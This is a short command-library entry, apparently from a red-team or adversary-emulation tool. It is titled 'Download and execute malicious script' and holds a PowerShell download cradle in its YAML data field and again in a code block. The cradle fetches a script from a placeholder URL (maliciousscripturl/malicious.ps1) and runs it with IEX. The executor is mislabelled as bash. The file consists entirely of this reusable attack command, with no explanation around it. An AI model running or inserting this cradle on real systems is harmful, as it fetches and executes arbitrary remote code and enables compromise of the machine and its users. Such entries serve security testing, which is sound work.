---
id: bd7878d1-da7a-4329-a7fd-4ec616510f4d
name: Download and execute malicious script
type: command
executor: bash
data: '$webreq = [System.Net.WebRequest]::Create(‘https://maliciousscripturl/malicious.ps1’)

  $resp=$webreq.GetResponse()

  $respstream=$resp.GetResponseStream()

  $reader=[System.IO.StreamReader]::new($respstream)

  $content=$reader.ReadToEnd()

  IEX($content)'
output: null
created_at: '2023-04-06T03:56:25.916043+00:00'
updated_at: '2023-04-10T20:36:16.231001+00:00'
---

# Download and execute malicious script

```bash
$webreq = [System.Net.WebRequest]::Create(‘https://maliciousscripturl/malicious.ps1’)
$resp=$webreq.GetResponse()
$respstream=$resp.GetResponseStream()
$reader=[System.IO.StreamReader]::new($respstream)
$content=$reader.ReadToEnd()
IEX($content)
```


